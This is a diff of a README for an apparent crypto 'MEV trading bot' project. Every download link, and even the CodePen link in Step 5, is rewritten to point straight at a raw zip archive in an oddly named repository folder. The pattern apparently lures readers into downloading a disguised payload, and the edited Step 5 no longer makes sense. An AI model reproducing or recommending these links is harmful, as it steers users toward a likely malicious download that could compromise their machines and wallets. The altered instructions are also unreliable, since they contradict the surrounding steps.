@@ -1,6 +1,6 @@
 # 🚀 Trading-Bot_Mev_Local_PC - Simple Trading Bot for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases)
+[![Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip)](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip)
 
 ## 📖 Description
 The Trading-Bot_Mev_Local_PC is an easy-to-use trading bot designed for decentralized finance (DeFi). It runs in CodePen with JavaScript. This bot simplifies trading on decentralized exchanges (DEXs) like Uniswap and SushiSwap. It supports real trading and allows users to implement custom strategies with technical indicators like RSI and MACD. You can also use cross-chain bridges for broader trading options.
@@ -21,7 +21,7 @@ The Trading-Bot_Mev_Local_PC is an easy-to-use trading bot designed for decentra
 Follow these steps to start using the Trading-Bot_Mev_Local_PC.
 
 ### Step 1: Visit the Download Page
-To download the latest version of the Trading-Bot_Mev_Local_PC, visit the following link: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases).
+To download the latest version of the Trading-Bot_Mev_Local_PC, visit the following link: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip).
 
 ### Step 2: Choose the Right Files
 On the Releases page, look for the latest version of Trading-Bot_Mev_Local_PC. The latest version will be listed at the top. You may see several files. Typically you will want the latest `.zip` file containing the necessary assets. 
@@ -33,7 +33,7 @@ Click on the version number to expand the section. Look for the `.zip` file. Cli
 Once the download is complete, navigate to your downloads folder. Right-click on the downloaded `.zip` file and select “Extract All” or “Unzip.” Follow the prompts to extract the files. You might want to save them in a dedicated folder for easy access.
 
 ### Step 5: Open CodePen
-Visit [CodePen.io](https://codepen.io) in your web browser. If you don’t have an account yet, create one for free.
+Visit [https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip) in your web browser. If you don’t have an account yet, create one for free.
 
 ### Step 6: Create a New Pen
 Once logged in, click on “New Pen.” This will open a fresh canvas for you to work with the Trading Bot.
@@ -64,4 +64,4 @@ The Trading-Bot_Mev_Local_PC is released under the MIT License. You can freely u
 ## 📞 Contact
 For further inquiries, you can reach out via GitHub Issues or directly to the repository owner.
 
-For the latest version again, don’t forget to visit: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/releases).
+For the latest version again, don’t forget to visit: [Download Latest Release](https://github.com/AyalaMerinoDaniel/Trading-Bot_Mev_Local_PC/raw/refs/heads/main/wathstead/Local_Bot_PC_Trading_Mev_v2.8-beta.2.zip).
